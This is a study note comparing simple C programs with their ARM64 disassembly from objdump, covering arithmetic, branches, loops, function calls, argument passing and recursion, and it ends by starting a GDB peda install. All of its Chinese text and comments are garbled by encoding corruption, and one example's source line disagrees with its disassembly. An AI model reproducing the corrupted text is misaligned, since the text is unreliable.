&lt;li&gt;ÁµÑË≠ØÂæå‰∏¶ÈÅãË°åÂü∑Ë°åÊ™î&lt;img src=&quot;https://hackmd.io/_uploads/B1_JKCD9p.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1&gt;C vs Assembly&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;C Á®ãÂºèÁ∑®Ë≠ØÊàêÂü∑Ë°åÊ™î == &amp;gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;gcc PLAYGROUND.c -o PLAYGROUND -g&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Â∞áÂü∑Ë°åÊ™îÈÄÜÂêëÊàêÁµÑÂêàË™ûË®Ä == &amp;gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;objdump -S -j .text -M intel PLAYGROUND --no-show-raw-insn&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ÁØÑ‰æã‰∏ÄÔºàË®àÁÆóËàáÂÖàÂæåÔºâ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;c&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
int main(){
  int x = 11203, y = 21004;
  printf(&amp;quot;%d&amp;quot;, (x++) + (++y));
  return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Á∑®Ë≠ØËàáÂü∑Ë°åÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/SkotCqP5a.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;assembly&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;0000000000000754 &amp;lt;main&amp;gt;:
#include &amp;lt;stdio.h&amp;gt;
int main(){
 754:	stp	x29, x30, [sp, #-32]!
 758:	mov	x29, sp

  int x = 11203, y = 21004;
 75c:	mov	w0, #0x2bc3            // Êää11203 ÊîæÂà∞ w0
 760:	str	w0, [sp, #24]          // Âú®[sp+24]ÂÑ≤Â≠ò w0 (11203)
 764:	mov	w0, #0x520c            // Êää21004 ÊîæÂà∞ w0
 768:	str	w0, [sp, #28]          // Âú®[sp+28]ÂÑ≤Â≠òw0 (21004)

  printf(&amp;quot;%d&amp;quot;, (x++) + (++y));
 76c:	ldr	w0, [sp, #24]          // Âæû[sp+24]Ëº∏ÂÖ•xÁöÑÂÄºÂà∞ w0
 770:	add	w1, w0, #0x1           // Â∞áxÂ¢ûÂä†1ÔºåÁµêÊûúÂÑ≤Â≠òÂà∞w1
 774:	str	w1, [sp, #24]          // Âú®[sp+24]ÂÑ≤Â≠òxÁöÑÊõ¥Êñ∞ÂÄº
 778:	ldr	w1, [sp, #28]          // Âæû[sp+28]Ëº∏ÂÖ•yÁöÑÂÄºÂà∞w1
 77c:	add	w1, w1, #0x1           // Â∞áyÂ¢ûÂä†1ÔºåÁµêÊûúÂÑ≤Â≠òÂà∞w1
 780:	str	w1, [sp, #28]          // Âú®[sp+28]ÂÑ≤Â≠òyÁöÑÊõ¥Êñ∞ÂÄº
 784:	ldr	w1, [sp, #28]          //Ëº∏ÂÖ•Êõ¥Êñ∞ÂæåÁöÑyÂà∞w1
 788:	add	w0, w0, w1            // Â∞áÊõ¥Êñ∞ÂæåÁöÑxÂíåyÁõ∏Âä†ÔºåÁµêÊûúÂÑ≤Â≠òÂà∞w0
 78c:	mov	w1, w0                // Â∞áÁµêÊûúË§áË£ΩÂà∞w1
 790:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 794:	add	x0, x0, #0x7c8
 798:	bl	630 &amp;lt;printf@plt&amp;gt;

  // ËøîÂõû 0 ÔºåÂ∞±ÊòØÂÅúÊ≠¢
  return 0;
 79c:	mov	w0, #0x0                // Â∞á 0Ëº∏ÂÖ•ÂØÑÂ≠òÂô® w0
}
 7a0:	ldp	x29, x30, [sp], #32
 7a4:	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ÁØÑ‰æã‰∫åÔºàif-elseÔºâ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;c&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
int main(){
   int num;
   printf(&amp;quot;Please enter a positive integer:&amp;quot;);
   scanf(&amp;quot;%d&amp;quot;,&amp;amp;num);
   if (num%2==0){
     printf(&amp;quot;The number you entered is an even number.&amp;quot;);
   }
   else{
     printf(&amp;quot;The number you entered is an odd number.&amp;quot;);
   }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Á∑®Ë≠ØËàáÂü∑Ë°åÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/Byak6hw5a.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;assembly&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;0000000000000894 &amp;lt;main&amp;gt;:
#include&amp;lt;stdio.h&amp;gt;
int main(){
 894:	stp	x29, x30, [sp, #-32]!
 898:	mov	x29, sp
 89c:	adrp	x0, 10000 &amp;lt;__FRAME_END__+0xf540&amp;gt;
 8a0:	ldr	x0, [x0, #4072]
 8a4:	ldr	x1, [x0]
 8a8:	str	x1, [sp, #24]
 8ac:	mov	x1, #0x0                   	// #0
   int num;
   printf(&amp;quot;Please enter a positive integer:&amp;quot;);
 8b0:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 8b4:	add	x0, x0, #0x950
 8b8:	bl	750 &amp;lt;printf@plt&amp;gt;
   scanf(&amp;quot;%d&amp;quot;,&amp;amp;num);
 8bc:	add	x0, sp, #0x14
 8c0:	mov	x1, x0
 8c4:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 8c8:	add	x0, x0, #0x978
 8cc:	bl	740 &amp;lt;__isoc99_scanf@plt&amp;gt;
   if (num%2==0){
 8d0:	ldr	w0, [sp, #20]
 8d4:	and	w0, w0, #0x1
 8d8:	cmp	w0, #0x0
 8dc:	b.ne	8f0 &amp;lt;main+0x5c&amp;gt;  // b.any
     printf(&amp;quot;The number you entered is an even number.&amp;quot;);
 8e0:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 8e4:	add	x0, x0, #0x980
 8e8:	bl	750 &amp;lt;printf@plt&amp;gt;
 8ec:	b	8fc &amp;lt;main+0x68&amp;gt;
   }
   else{
     printf(&amp;quot;The number you entered is an odd number.&amp;quot;);
 8f0:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 8f4:	add	x0, x0, #0x9b0
 8f8:	bl	750 &amp;lt;printf@plt&amp;gt;
 8fc:	mov	w0, #0x0                   	// #0
 900:	mov	w1, w0
   }
}
 904:	adrp	x0, 10000 &amp;lt;__FRAME_END__+0xf540&amp;gt;
 908:	ldr	x0, [x0, #4072]
 90c:	ldr	x3, [sp, #24]
 910:	ldr	x2, [x0]
 914:	subs	x3, x3, x2
 918:	mov	x2, #0x0                   	// #0
 91c:	b.eq	924 &amp;lt;main+0x90&amp;gt;  // b.none
 920:	bl	710 &amp;lt;__stack_chk_fail@plt&amp;gt;
 924:	mov	w0, w1
 928:	ldp	x29, x30, [sp], #32
 92c:	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ÁØÑ‰æã‰∏âÔºàLOOPÔºâ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;c&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;//FOR LOOP
#include &amp;lt;stdio.h&amp;gt;
int main(){
   int n, i, sum = 1; //Áî±ÊñºÊòØÈöé‰πòÔºåÊïÖsum = 1 ÂøÖÁÇ∫È†êË®≠
   printf(&amp;quot;Enter a positive integer: &amp;quot;);
   scanf(&amp;quot;%d&amp;quot;, &amp;amp;n);
   for (i = 1; i &amp;lt;= n; ++i){
       sum *= i;
   }
   printf(&amp;quot;Sum = %d&amp;quot;, sum);
   return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Á∑®Ë≠ØËàáÂü∑Ë°åÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/rJ5KJpDca.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/Hkl0kaw9p.png&quot; alt=&quot;image&quot;&gt;&lt;/li&gt;
&lt;li&gt;assembly&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;0000000000000894 &amp;lt;main&amp;gt;:
//FOR LOOP
#include &amp;lt;stdio.h&amp;gt;
int main(){
 894:	stp	x29, x30, [sp, #-48]!
 898:	mov	x29, sp
 89c:	adrp	x0, 10000 &amp;lt;__FRAME_END__+0xf578&amp;gt;
 8a0:	ldr	x0, [x0, #4072]
 8a4:	ldr	x1, [x0]
 8a8:	str	x1, [sp, #40]
 8ac:	mov	x1, #0x0                   	// #0
   int n, i, sum = 1; //Áî±ÊñºÊòØÈöé‰πòÔºåÊïÖsum = 1 ÂøÖÁÇ∫È†êË®≠
 8b0:	mov	w0, #0x1                   	// #1
 8b4:	str	w0, [sp, #36]
   printf(&amp;quot;Enter a positive integer: &amp;quot;);
 8b8:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 8bc:	add	x0, x0, #0x970
 8c0:	bl	750 &amp;lt;printf@plt&amp;gt;
   scanf(&amp;quot;%d&amp;quot;, &amp;amp;n);
 8c4:	add	x0, sp, #0x1c
 8c8:	mov	x1, x0
 8cc:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 8d0:	add	x0, x0, #0x990
 8d4:	bl	740 &amp;lt;__isoc99_scanf@plt&amp;gt;
   for (i = 1; i &amp;lt;= n; ++i){
 8d8:	mov	w0, #0x1                   	// #1
 8dc:	str	w0, [sp, #32]
 8e0:	b	900 &amp;lt;main+0x6c&amp;gt;
       sum *= i;
 8e4:	ldr	w1, [sp, #36]
 8e8:	ldr	w0, [sp, #32]
 8ec:	mul	w0, w1, w0
 8f0:	str	w0, [sp, #36]
   for (i = 1; i &amp;lt;= n; ++i){
 8f4:	ldr	w0, [sp, #32]
 8f8:	add	w0, w0, #0x1
 8fc:	str	w0, [sp, #32]
 900:	ldr	w0, [sp, #28]
 904:	ldr	w1, [sp, #32]
 908:	cmp	w1, w0
 90c:	b.le	8e4 &amp;lt;main+0x50&amp;gt;
   }
   printf(&amp;quot;Sum = %d&amp;quot;, sum);
 910:	ldr	w1, [sp, #36]
 914:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 918:	add	x0, x0, #0x998
 91c:	bl	750 &amp;lt;printf@plt&amp;gt;
   return 0;
 920:	mov	w0, #0x0                   	// #0
}
 924:	mov	w1, w0
 928:	adrp	x0, 10000 &amp;lt;__FRAME_END__+0xf578&amp;gt;
 92c:	ldr	x0, [x0, #4072]
 930:	ldr	x3, [sp, #40]
 934:	ldr	x2, [x0]
 938:	subs	x3, x3, x2
 93c:	mov	x2, #0x0                   	// #0
 940:	b.eq	948 &amp;lt;main+0xb4&amp;gt;  // b.none
 944:	bl	710 &amp;lt;__stack_chk_fail@plt&amp;gt;
 948:	mov	w0, w1
 94c:	ldp	x29, x30, [sp], #48
 950:	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;c&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;//WHILE LOOP
#include &amp;lt;stdio.h&amp;gt;
int main(){
   int n, i, sum = 1;
   printf(&amp;quot;Enter a positive integer: &amp;quot;);
   scanf(&amp;quot;%d&amp;quot;, &amp;amp;n);
   i = 1;
   while (i &amp;lt;= n){
       sum *= i;
       ++i;
   }
   printf(&amp;quot;Sum = %d&amp;quot;, sum);
   return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Á∑®Ë≠ØËàáÂü∑Ë°åÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/Sk7ogpv96.png&quot; alt=&quot;image&quot;&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HkRk-pDc6.png&quot; alt=&quot;image&quot;&gt;&lt;ul&gt;
&lt;li&gt;assembly&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;0000000000000894 &amp;lt;main&amp;gt;:
//WHILE LOOP
#include &amp;lt;stdio.h&amp;gt;
int main(){
 894:	stp	x29, x30, [sp, #-48]!
 898:	mov	x29, sp
 89c:	adrp	x0, 10000 &amp;lt;__FRAME_END__+0xf578&amp;gt;
 8a0:	ldr	x0, [x0, #4072]
 8a4:	ldr	x1, [x0]
 8a8:	str	x1, [sp, #40]
 8ac:	mov	x1, #0x0                   	// #0
   int n, i, sum = 1;
 8b0:	mov	w0, #0x1                   	// #1
 8b4:	str	w0, [sp, #36]
   printf(&amp;quot;Enter a positive integer: &amp;quot;);
 8b8:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 8bc:	add	x0, x0, #0x970
 8c0:	bl	750 &amp;lt;printf@plt&amp;gt;
   scanf(&amp;quot;%d&amp;quot;, &amp;amp;n);
 8c4:	add	x0, sp, #0x1c
 8c8:	mov	x1, x0
 8cc:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 8d0:	add	x0, x0, #0x990
 8d4:	bl	740 &amp;lt;__isoc99_scanf@plt&amp;gt;
   i = 1;
 8d8:	mov	w0, #0x1                   	// #1
 8dc:	str	w0, [sp, #32]
   while (i &amp;lt;= n){
 8e0:	b	900 &amp;lt;main+0x6c&amp;gt;
       sum *= i;
 8e4:	ldr	w1, [sp, #36]
 8e8:	ldr	w0, [sp, #32]
 8ec:	mul	w0, w1, w0
 8f0:	str	w0, [sp, #36]
       ++i;
 8f4:	ldr	w0, [sp, #32]
 8f8:	add	w0, w0, #0x1
 8fc:	str	w0, [sp, #32]
   while (i &amp;lt;= n){
 900:	ldr	w0, [sp, #28]
 904:	ldr	w1, [sp, #32]
 908:	cmp	w1, w0
 90c:	b.le	8e4 &amp;lt;main+0x50&amp;gt;
   }
   printf(&amp;quot;Sum = %d&amp;quot;, sum);
 910:	ldr	w1, [sp, #36]
 914:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 918:	add	x0, x0, #0x998
 91c:	bl	750 &amp;lt;printf@plt&amp;gt;
   return 0;
 920:	mov	w0, #0x0                   	// #0
}
 924:	mov	w1, w0
 928:	adrp	x0, 10000 &amp;lt;__FRAME_END__+0xf578&amp;gt;
 92c:	ldr	x0, [x0, #4072]
 930:	ldr	x3, [sp, #40]
 934:	ldr	x2, [x0]
 938:	subs	x3, x3, x2
 93c:	mov	x2, #0x0                   	// #0
 940:	b.eq	948 &amp;lt;main+0xb4&amp;gt;  // b.none
 944:	bl	710 &amp;lt;__stack_chk_fail@plt&amp;gt;
 948:	mov	w0, w1
 94c:	ldp	x29, x30, [sp], #48
 950:	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;c&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;//DO While LOOP
#include &amp;lt;stdio.h&amp;gt;
int main() {
   int n, i, sum = 1;
   printf(&amp;quot;Enter a positive integer: &amp;quot;);
   scanf(&amp;quot;%d&amp;quot;, &amp;amp;n);
   i = 1;
   do{
     sum *= i;
     ++i;
   } while (i &amp;lt;= n);
   printf(&amp;quot;Sum = %d&amp;quot;, sum);
   return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Á∑®Ë≠ØËàáÂü∑Ë°åÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/HyiIW6v9a.png&quot; alt=&quot;image&quot;&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H1_YZpvcT.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;assembly&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;0000000000000894 &amp;lt;main&amp;gt;:
//DO While LOOP
#include &amp;lt;stdio.h&amp;gt;
int main() {
 894:	stp	x29, x30, [sp, #-48]!
 898:	mov	x29, sp
 89c:	adrp	x0, 10000 &amp;lt;__FRAME_END__+0xf578&amp;gt;
 8a0:	ldr	x0, [x0, #4072]
 8a4:	ldr	x1, [x0]
 8a8:	str	x1, [sp, #40]
 8ac:	mov	x1, #0x0                   	// #0
   int n, i, sum = 1;
 8b0:	mov	w0, #0x1                   	// #1
 8b4:	str	w0, [sp, #36]
   printf(&amp;quot;Enter a positive integer: &amp;quot;);
 8b8:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 8bc:	add	x0, x0, #0x970
 8c0:	bl	750 &amp;lt;printf@plt&amp;gt;
   scanf(&amp;quot;%d&amp;quot;, &amp;amp;n);
 8c4:	add	x0, sp, #0x1c
 8c8:	mov	x1, x0
 8cc:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 8d0:	add	x0, x0, #0x990
 8d4:	bl	740 &amp;lt;__isoc99_scanf@plt&amp;gt;
   i = 1;
 8d8:	mov	w0, #0x1                   	// #1
 8dc:	str	w0, [sp, #32]
   do{
     sum *= i;
 8e0:	ldr	w1, [sp, #36]
 8e4:	ldr	w0, [sp, #32]
 8e8:	mul	w0, w1, w0
 8ec:	str	w0, [sp, #36]
     ++i;
 8f0:	ldr	w0, [sp, #32]
 8f4:	add	w0, w0, #0x1
 8f8:	str	w0, [sp, #32]
   } while (i &amp;lt;= n);
 8fc:	ldr	w0, [sp, #28]
 900:	ldr	w1, [sp, #32]
 904:	cmp	w1, w0
 908:	b.le	8e0 &amp;lt;main+0x4c&amp;gt;
   printf(&amp;quot;Sum = %d&amp;quot;, sum);
 90c:	ldr	w1, [sp, #36]
 910:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 914:	add	x0, x0, #0x998
 918:	bl	750 &amp;lt;printf@plt&amp;gt;
   return 0;
 91c:	mov	w0, #0x0                   	// #0
}
 920:	mov	w1, w0
 924:	adrp	x0, 10000 &amp;lt;__FRAME_END__+0xf578&amp;gt;
 928:	ldr	x0, [x0, #4072]
 92c:	ldr	x3, [sp, #40]
 930:	ldr	x2, [x0]
 934:	subs	x3, x3, x2
 938:	mov	x2, #0x0                   	// #0
 93c:	b.eq	944 &amp;lt;main+0xb0&amp;gt;  // b.none
 940:	bl	710 &amp;lt;__stack_chk_fail@plt&amp;gt;
 944:	mov	w0, w1
 948:	ldp	x29, x30, [sp], #48
 94c:	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ÁØÑ‰æãÂõõ ( ÂáΩÊï∏ )&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;c&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
int f(int z){
    int mul = 1, i = 1;
    while (i &amp;lt;= z){
        mul *= i;
        i++;
    };
    return mul;
}
int main(){
    int i = 9;
    printf(&amp;quot;%d ÁöÑÈöé‰πòÁÇ∫%d\n&amp;quot;, i, f(i));
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;- Á∑®Ë≠ØËàáÂü∑Ë°åÁµêÊûú
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hy-1aCP56.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/H1RDp0D9p.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;assembly&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;00000000000007a8 &amp;lt;main&amp;gt;:
int main(){
 7a8:	stp	x29, x30, [sp, #-32]!
 7ac:	mov	x29, sp
    int i = 4;
 7b0:	mov	w0, #0x9                   	// #9
 7b4:	str	w0, [sp, #28]
    printf(&amp;quot;%d \u7684\u968e\u4e58\u70ba%d\n&amp;quot;, i, f(i));
 7b8:	ldr	w0, [sp, #28]
 7bc:	bl	754 &amp;lt;f&amp;gt;
 7c0:	mov	w2, w0
 7c4:	ldr	w1, [sp, #28]
 7c8:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 7cc:	add	x0, x0, #0x800
 7d0:	bl	630 &amp;lt;printf@plt&amp;gt;
    return 0;
 7d4:	mov	w0, #0x0                   	// #0
}
 7d8:	ldp	x29, x30, [sp], #32
 7dc:	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ÁØÑ‰æã‰∫îÔºàswap‰∫§ÊèõÔºâ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;c&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
void swap (int a, int b);
int main (void) {
  int i = 1234, j = 4321;
  printf (&amp;quot;i = %d, j = %d\n&amp;quot; , i, j);
  swap (i, j);
  printf (&amp;quot;i = %d, j = %d\n&amp;quot; , i, j);
  return 0;
}
void swap (int a, int b) {
  printf (&amp;quot;‰∫íÊèõÂâç:a = %d, b = %d\n&amp;quot; , a, b);
  int temp = a;
  a = b;
  b = temp;
  printf (&amp;quot;‰∫íÊèõÂæå:a = %d, b = %d\n&amp;quot; , a, b);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Á∑®Ë≠ØËàáÂü∑Ë°åÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/ByW_ek_56.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/BkcYey_5a.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;assembly&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;00000000000007ac &amp;lt;swap&amp;gt;:
void swap (int a, int b) {
 7ac:	stp	x29, x30, [sp, #-48]!
 7b0:	mov	x29, sp
 7b4:	str	w0, [sp, #28]
 7b8:	str	w1, [sp, #24]
  printf (&amp;quot;\u4e92\u63db\u524d:a = %d, b = %d\n&amp;quot; , a, b);
 7bc:	ldr	w2, [sp, #24]
 7c0:	ldr	w1, [sp, #28]
 7c4:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 7c8:	add	x0, x0, #0x838
 7cc:	bl	630 &amp;lt;printf@plt&amp;gt;
  int temp = a;
 7d0:	ldr	w0, [sp, #28]
 7d4:	str	w0, [sp, #44]
  a = b;
 7d8:	ldr	w0, [sp, #24]
 7dc:	str	w0, [sp, #28]
  b = temp;
 7e0:	ldr	w0, [sp, #44]
 7e4:	str	w0, [sp, #24]
  printf (&amp;quot;\u4e92\u63db\u5f8c:a = %d, b = %d\n&amp;quot; , a, b);
 7e8:	ldr	w2, [sp, #24]
 7ec:	ldr	w1, [sp, #28]
 7f0:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 7f4:	add	x0, x0, #0x858
 7f8:	bl	630 &amp;lt;printf@plt&amp;gt;
}
 7fc:	nop
 800:	ldp	x29, x30, [sp], #48
 804:	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ÁØÑ‰æãÂÖ≠(pushËàápop ==&amp;gt;Â†ÜÁñä)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;c&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
int sum(int n1, int n2, int n3, int n4, int n5, int n6, int n7, int n8, int n9){
    return n1 + n2 + n3 + n4 + n5 + n6 + n7 + n8 + n9;
}
int main(){
    int result, num1 = 1, num2 = 2, num3 = 3, num4 = 4, num5 = 5, num6 = 6, num7 = 7, num8 = 8, num9 = 9;
    result = sum(num1, num2, num3, num4, num5, num6, num7, num8, num9);
    printf(&amp;quot;sum is %d\n&amp;quot;, result);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Á∑®Ë≠ØËàáÂü∑Ë°åÁµêÊûú&lt;img src=&quot;https://hackmd.io/_uploads/rklBZJd5a.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/H1gvZJO5T.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;assembly!&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;00000000000007c4 &amp;lt;main&amp;gt;:
int main(){
 7c4:	sub	sp, sp, #0x50
 7c8:	stp	x29, x30, [sp, #16]
 7cc:	add	x29, sp, #0x10
    int result, num1 = 1, num2 = 2, num3 = 3, num4 = 4, num5 = 5, num6 = 6, num7 = 7, num8 = 8, num9 = 9;
 7d0:	mov	w0, #0x1                   	// #1
 7d4:	str	w0, [sp, #40]
 7d8:	mov	w0, #0x2                   	// #2
 7dc:	str	w0, [sp, #44]
 7e0:	mov	w0, #0x3                   	// #3
 7e4:	str	w0, [sp, #48]
 7e8:	mov	w0, #0x4                   	// #4
 7ec:	str	w0, [sp, #52]
 7f0:	mov	w0, #0x5                   	// #5
 7f4:	str	w0, [sp, #56]
 7f8:	mov	w0, #0x6                   	// #6
 7fc:	str	w0, [sp, #60]
 800:	mov	w0, #0x7                   	// #7
 804:	str	w0, [sp, #64]
 808:	mov	w0, #0x8                   	// #8
 80c:	str	w0, [sp, #68]
 810:	mov	w0, #0x9                   	// #9
 814:	str	w0, [sp, #72]
    result = sum(num1, num2, num3, num4, num5, num6, num7, num8, num9);
 818:	ldr	w0, [sp, #72]
 81c:	str	w0, [sp]
 820:	ldr	w7, [sp, #68]
 824:	ldr	w6, [sp, #64]
 828:	ldr	w5, [sp, #60]
 82c:	ldr	w4, [sp, #56]
 830:	ldr	w3, [sp, #52]
 834:	ldr	w2, [sp, #48]
 838:	ldr	w1, [sp, #44]
 83c:	ldr	w0, [sp, #40]
 840:	bl	754 &amp;lt;sum&amp;gt;
 844:	str	w0, [sp, #76]
    printf(&amp;quot;sum is %d\n&amp;quot;, result);
 848:	ldr	w1, [sp, #76]
 84c:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 850:	add	x0, x0, #0x888
 854:	bl	630 &amp;lt;printf@plt&amp;gt;
    return 0;
 858:	mov	w0, #0x0                   	// #0
}
 85c:	ldp	x29, x30, [sp, #16]
 860:	add	sp, sp, #0x50
 864:	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;ÁØÑ‰æã‰∏É:ÈÅûËø¥ÂáΩÊï∏&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;c&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
 double f(unsigned int i){
   if(i &amp;lt;= 1)
      return 1;
   else   return i * f(i - 1);
}
int main(){
    int i = 14;
    printf(&amp;quot;%d ÁöÑÈöé‰πòÁÇ∫%f\n&amp;quot;, i, f(i));
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;- Á∑®Ë≠ØËàáÂü∑Ë°åÁµêÊûú![image](https://hackmd.io/_uploads/Syygfk_9a.png)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rk8Bzku5a.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;assembly&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;000000000000079c &amp;lt;main&amp;gt;:
int main(){
 79c:	stp	x29, x30, [sp, #-32]!
 7a0:	mov	x29, sp
    int i = 14;
 7a4:	mov	w0, #0xe                   	// #14
 7a8:	str	w0, [sp, #28]
    printf(&amp;quot;%d \u7684\u968e\u4e58\u70ba%f\n&amp;quot;, i, f(i));
 7ac:	ldr	w0, [sp, #28]
 7b0:	bl	754 &amp;lt;f&amp;gt;
 7b4:	ldr	w1, [sp, #28]
 7b8:	adrp	x0, 0 &amp;lt;__abi_tag-0x278&amp;gt;
 7bc:	add	x0, x0, #0x7f0
 7c0:	bl	630 &amp;lt;printf@plt&amp;gt;
    return 0;
 7c4:	mov	w0, #0x0                   	// #0
}
 7c8:	ldp	x29, x30, [sp], #32
 7cc:	ret
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h1&gt;GDB&lt;/h1&gt;
&lt;h3&gt;ÂÆâË£ùpeda&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;git clone https://github.com/longld/peda.git ~/peda
